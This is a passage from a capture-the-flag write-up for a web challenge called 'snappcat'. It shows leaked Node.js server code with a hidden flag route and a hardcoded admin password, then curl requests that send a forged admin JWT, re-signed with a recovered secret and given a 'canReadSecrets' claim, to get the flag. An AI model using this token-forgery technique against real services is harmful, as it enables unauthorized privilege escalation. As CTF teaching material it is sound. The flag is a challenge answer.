        "catId should match /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/",
      success: false,
    });
  }

  let cat = cats.get(catid);
  if (!cat) {
    return res.status(404).json({ message: "cat not found", success: false });
  }

  cat = Object.assign({}, cat);

  fs.readFile(cat.imagePath, (err, result) => {
    if (err) {
      return res.status(500).json({
        message: `Something bad happened while reading the file. Error in /app/index.js: ${err.stack}`,
        success: false,
      });
    }
    cat.image = result.toString("base64");
    delete cat.imagePath;
    return res.json({ data: { cat }, success: true });
  });
});

app.get(
  "/secrets-8d5a332d9de35f593e5252c70c0f8d3e/flag",
  authCheck,
  (req, res) => {
    if (req.sess.canReadSecrets) {
      // Hint: flag variable contains what you are looking for...
      return res.type("text/plain").send(`FLAG: ${flag}`);
    }
    return res.type("text/plain").send("??");
  }
);
(() => {
  registeredUsernames.add("admin");
  users.set(1, {
    userId: 1,
    username: "admin",
    password: sha256("ramz-kheili-sakht-1337"),
    phoneNumber: "+133731333717",
    isVerified: true,
  });
  if (!/SNAPP/.test(flag)) {
    process.exit(1);
  }
  fs.writeFileSync("/flag.txt", "");
  app.listen(8000, () => console.log("Server running on port 8000"));
})();
```

## step4

**modify cookie**

after review server code, we find out that must call this:

```
curl --location 'https://snappcat.spchallenge.ir/secrets-8d5a332d9de35f593e5252c70c0f8d3e/flag' --header 'Cookie: sess=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsImlhdCI6MTcwODYzMTk2N30.xbZoNkdioNqHv5jGem77cAdez0m_VNzr8dJHMNYp0uM; Max-Age=3600; Path=/; Expires=Thu, 24 Feb 2024 20:59:27 GMT; HttpOnly'
```

but no any flag response!

you must enable `canReadSecrets` into jwt token.
also you have jwt secret key, so you can go to `https://jwt.io/` and update admin jwt token payload as:

```
{
  "userId": 1,
  "canReadSecrets": true,
  "iat": 1708631967
}
```

resign and generate new token, and use it:

```
curl --location 'https://snappcat.spchallenge.ir/secrets-8d5a332d9de35f593e5252c70c0f8d3e/flag' --header 'Cookie: sess=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsImNhblJlYWRTZWNyZXRzIjp0cnVlLCJpYXQiOjE3MDg2MzE5Njd9.Isd-0KldcwSSIAHq9AhvL2OHltA2TFGm1aPs5QI9xuw; Max-Age=3600; Path=/; Expires=Thu, 24 Feb 2024 20:59:27 GMT; HttpOnly'
```

so in response, you can get the FLAG:

**`FLAG: SNAPP{7dc998269394314896af6378f15c2c12}`**

## author

- name: SNAPP

- written by: madkne in 2024.02.23

- website: https://snappctf.com
